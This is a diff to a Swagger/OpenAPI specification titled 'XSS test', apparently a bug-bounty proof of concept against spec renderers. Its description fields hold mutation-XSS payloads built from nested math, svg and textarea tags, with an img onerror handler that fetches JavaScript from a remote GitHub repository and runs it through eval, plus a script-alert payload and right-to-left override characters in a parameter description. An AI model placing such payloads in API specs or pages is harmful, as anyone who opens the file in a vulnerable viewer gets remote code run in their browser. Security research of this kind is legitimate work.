@@ -2,7 +2,8 @@ swagger: '2.0'
 info:
   title: XSS test
   description: >
-    <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/github-bounty/shorty-swagger-pocs/main/poc.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>"><math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><math><mtext><h1><a><h6></a></h6><math><mtext><h1><a><h6><math><mtext><h1><a><h6></a><math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/github-bounty/shorty-swagger-pocs/main/poc.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/github-bounty/shorty-swagger-pocs/main/poc.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/github-bounty/shorty-swagger-pocs/main/poc.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/github-bounty/shorty-swagger-pocs/main/poc.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/github-bounty/shorty-swagger-pocs/main/poc.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea>"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math><marquee>dave
+    <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror="fetch(`https://raw.githubusercontent.com/github-bounty/shorty-swagger-pocs/main/poc.js`).then(function(res){res.text().then(function(data){eval(data)})})\u202E\u202E\u202E"></textarea></h1>">
+    "</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
   version: production
 paths:
   /complementary/provide_recommendations:
@@ -13,7 +14,10 @@ paths:
           in: query
           required: true
           type: string
-          description: ID of the product to get recommendations for
+          description: >
+            XSS Test: <script>alert('XSS');</script> 
+            UTF-16: \u0041\u0042\u0043\u0044\u0045
+            RTLO: \u202Etest
       responses:
         403:
           description: Forbidden
